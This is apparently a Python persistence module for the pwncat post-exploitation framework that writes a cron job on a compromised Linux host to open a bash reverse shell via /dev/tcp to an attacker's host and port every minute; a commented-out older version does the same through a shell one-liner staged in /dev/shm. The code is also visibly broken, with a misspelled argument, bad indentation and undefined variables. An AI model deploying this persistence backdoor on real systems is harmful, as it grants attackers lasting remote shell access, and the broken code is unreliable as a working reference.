import os, pwncat, random
from crontab import CronTab
from cron_descriptor import get_description, ExpressionDescriptor
from pwncat.modules import Argument, Status, PersistType, PersistError
from pwncat.modules.persist import PersistModule
#from pwncat import util
#from pwncat.persist import PersistenceMethod, PersistenceError
#from pwncat.util import Access, CompilationError, console
#import pwncat

class Module(PersistModule):
    TYPE = PersistType.LOCAL
    ARGUMENTS = {
            **PersistModule.ARGUMENTS,
            "lhost": Argument(
                str, defualt=pwncat.victim.host.ip, help="The host to call back to"
            ),
            "lport": Argument(
                int, default=4444, help="The port to call back to"
            ),
            "schedule": Argument(
                str, default="* * * * *", help="The cron schedule"
            ),
            "shell": Argument(
                str, default="current", help="The shell to assign for the user"
            ),
        }
        PLATFORM = pwncat.platform.Platform.LINUX

        def install(self, user, lhost, lport, schedule, shell):
            if shell == "current":
                shell = pwncat.victim.shell
            try:
                randint = random.randint(1024, 65535)
                cron = CronTab(user=True)
                job = cron.new(command='echo ' + str(randint))
                job.minute.every(1)
                cron.write()
            except (PermissionError) as exc:
                raise PersistError(str(exc))
            cron.remove(job)
            cron.write()
            if schedule != "" and lhost != "" and lport != "":
                cron = crontab.CronTab(user=True)
                payload = str("bash -c 'bash -i > /dev/tcp/" + rhost.strip() + "/" + rport.strip() + " 2>&1'")
                job = cron.new(command=payload)
                c = 0
                for number in schedule.split():
                    if number != str("*"):
                        if c == 0:
                            job.minute.every(schedule.split()[0]) # 0-59
                        if c == 1:
                            job.hour.every(schedule.split()[1]) # 0-23
                        if c == 2:
                            job.day.on(schedule.split()[2]) # 1-31
                        if c == 3:
                            job.month.on(schedule.split()[3]) # 1-12
                        if c == 4:
                            job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
                        c += 1
                    # if number = * then do not set, the crontab module assumes that as default
                cron.write()
'''

    #system = False
    #name = "cron"
    #local = True
    def install(self, user):
        # Setting Variables for Callback. Cron syntax is not verified
        # An error in the crontab syntax does not disrupt current crons
        cron = str(input("Input Cron Scedule: ")).strip()
        rhost = str(input("LHOST? ")).strip()
        rport = str(input("LPORT? ")).strip()
        # Listing all crons and creating a temp file so we can make sure that all currently installed crons stay that way
        # Bash oneliner using "pwncat" string to differentiate our cron from any existing ones
        # Installing original list of crons, with the reverse shell added to it 
        pwncat.victim.run("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
        print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
    def remove(self, user):
        # Using "pwncat" string to remove our crons and reinstalling the original ones
        pwncat.victim.run("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")
'''
